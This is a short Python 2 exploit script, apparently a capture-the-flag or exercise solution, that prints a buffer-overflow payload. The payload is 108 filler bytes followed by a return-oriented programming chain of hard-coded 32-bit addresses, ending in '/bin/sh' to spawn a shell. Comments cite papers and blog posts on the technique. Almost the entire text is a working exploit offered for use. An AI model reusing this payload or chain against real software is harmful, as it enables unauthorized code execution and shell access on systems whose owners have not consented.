from struct import pack
print '\x01'*108+pack('<I',0xbffea810)+pack('<I',0x080481ec)+pack('<I',0xbffea77c)+pack('<I',0x080643e8)
+'\x01'*8+pack('<I',0x0808ff7d)+pack('<I',0xbffea87c)+'\x01'*8+pack('<I',0xbffea87c)+
pack('<I',0x08070ca3)+
'\x01'*12+('\x01'*4+pack('<I',0x08070ca3))*10+'\x01'*4+pack('<I',0x08057ae0)+'/bin/sh'

#recitation
#https://hovav.net/ucsd/dist/geometry.pdf
#https://blog.csdn.net/linyt/article/details/48738757
#https://www.cnblogs.com/alisecurity/p/5646656.html
#http://www.4hou.com/technology/11897.html
